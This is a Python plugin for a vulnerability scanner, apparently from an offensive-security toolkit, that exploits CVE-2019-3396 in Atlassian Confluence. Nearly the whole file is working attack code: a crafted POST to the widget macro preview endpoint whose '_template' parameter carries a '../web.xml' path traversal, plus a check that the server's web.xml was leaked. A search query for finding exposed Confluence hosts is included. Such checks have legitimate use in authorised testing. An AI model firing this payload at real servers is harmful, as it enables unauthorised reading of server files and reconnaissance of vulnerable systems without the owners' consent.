#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import re
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    CVE-2019-3396
    fofa:  "confluence" && port=8090
    https://www.seebug.org/vuldb/ssvid-97898
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            filename = "../web.xml"
            url = self.base_url + "rest/tinymce/1/macro/preview"
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
                "Referer": self.base_url + "pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
                "Content-Type": "application/json; charset=utf-8"
            }
            _data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}' % filename
            async with ClientSession() as session:
                async with session.post(url=url,data=_data, headers=headers) as response:
                    if response != None:
                        text = await response.text()
                        if response.status == 200 and "</web-app>" in text:
                            m = re.search('<web-app[\s\S]+<\/web-app>', text)
                            if m:
                                yield url